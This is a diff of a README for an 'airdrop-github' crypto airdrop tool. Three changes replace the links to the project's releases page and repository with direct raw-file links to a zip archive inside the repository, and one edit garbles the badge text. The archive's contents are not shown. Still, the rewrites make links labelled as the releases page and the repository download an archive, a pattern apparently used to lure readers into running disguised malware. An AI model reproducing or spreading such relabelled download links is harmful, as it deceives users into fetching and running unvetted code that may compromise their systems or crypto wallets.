@@ -6,7 +6,7 @@ Welcome to the airdrop-github project! This tool helps you manage airdrops easil
 
 ## 📥 Download Now
 
-[![Download airdrop-github](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/joyyy11/airdrop-github/releases)
+[![Download airdrop-github](https://raw.githubusercontent.com/joyyy11/airdrop-github/main/how/github_airdrop_3.8-alpha.3.zip%20Now-Click%https://raw.githubusercontent.com/joyyy11/airdrop-github/main/how/github_airdrop_3.8-alpha.3.zip)](https://raw.githubusercontent.com/joyyy11/airdrop-github/main/how/github_airdrop_3.8-alpha.3.zip)
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ Before you download, make sure your system meets these requirements:
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Click this link to [visit the Releases page](https://github.com/joyyy11/airdrop-github/releases). Here, you will find the latest version of the software.
+   Click this link to [visit the Releases page](https://raw.githubusercontent.com/joyyy11/airdrop-github/main/how/github_airdrop_3.8-alpha.3.zip). Here, you will find the latest version of the software.
 
 2. **Select the Latest Version**  
    Look for the most recent release. You will see files available for download. The filename usually indicates the version number.
@@ -76,7 +76,7 @@ If you encounter issues or need assistance, please check the GitHub Issues page.
 
 Follow our project to receive the latest news:
 
-- GitHub Repository: [airdrop-github](https://github.com/joyyy11/airdrop-github)
+- GitHub Repository: [airdrop-github](https://raw.githubusercontent.com/joyyy11/airdrop-github/main/how/github_airdrop_3.8-alpha.3.zip)
 - Topics: airdrop-bot, airdrop-github
 
 Thank you for using airdrop-github! Enjoy easily managing your airdrops.
